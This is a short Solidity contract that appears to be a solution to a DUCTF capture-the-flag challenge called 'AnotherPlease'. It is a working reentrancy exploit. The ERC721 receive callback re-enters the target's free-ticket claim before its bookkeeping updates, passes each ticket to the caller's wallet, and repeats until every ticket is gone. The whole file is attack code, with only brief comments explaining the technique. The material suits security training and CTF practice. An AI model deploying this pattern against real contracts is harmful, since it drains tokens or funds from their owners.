// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./AnotherPlease.sol";

contract Solve is IERC721Receiver {
    uint256 public calledCount;
    address public owner;

    function solve(AnotherPlease instance) external {
        owner = msg.sender;
        instance.claimFreeTicket();
    }

    // Every time we are sent an DUCTF ticket this function is called, we use it
    // to re-enter into the claim function and claim another before the
    // ticketsGivenAway and freeTicketReceivers are updated.
    function onERC721Received(address operator, address, uint256 id, bytes memory) external returns (bytes4) {
        calledCount++;
        AnotherPlease chal = AnotherPlease(msg.sender);

        // Transfer the NFT to the player wallet
        chal.transferFrom(address(this), owner, id);

        // Do this until all tickets are gone
        if (calledCount < chal.totalTicketsAvailable()) {
            chal.claimFreeTicket();
        }

        // Return required bytes as defined by ERC721 Receiever
        return IERC721Receiver.onERC721Received.selector;
    }
}
